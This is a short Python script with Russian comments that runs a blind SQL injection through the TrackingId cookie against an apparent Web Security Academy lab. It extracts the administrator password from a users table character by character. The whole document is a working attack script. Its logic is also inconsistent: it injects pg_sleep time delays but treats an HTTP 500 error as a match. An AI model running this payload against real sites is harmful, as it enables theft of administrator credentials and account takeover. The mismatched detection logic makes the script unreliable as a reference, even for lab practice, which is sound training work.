import requests

url = "https://0af1002a036c654985a685c700b800b1.web-security-academy.net/"
# Твой алфавит: буквы и цифры
alphabet = "abcdefghijklmnopqrstuvwxyz0123456789"
password = ""

print("[*] Начинаю подбор пароля...")


for position in range(1, 21):  # Перебираем 20 символов
    for char in alphabet:
        # Твой идеальный рабочий пейлоад
        payload = f"ZMNXzncFUVml8OfU'|| CASE WHEN (SELECT COUNT(username) FROM users WHERE username = 'administrator' AND SUBSTRING(Password, {position}, 1) = '{char}') = 1 THEN pg_sleep(2) ELSE pg_sleep(0) END --;"
        
        cookies = {'TrackingId': payload}
        response = requests.get(url, cookies=cookies)
        
        # Если база выдала ошибку 500 — буква угадана!
        if response.status_code == 500:
            password += char
            print(f"[+] Символ {position}: {char} -> Текущий пароль: {password}")
            break

print(f"[!] Готово! Итоговый пароль: {password}")
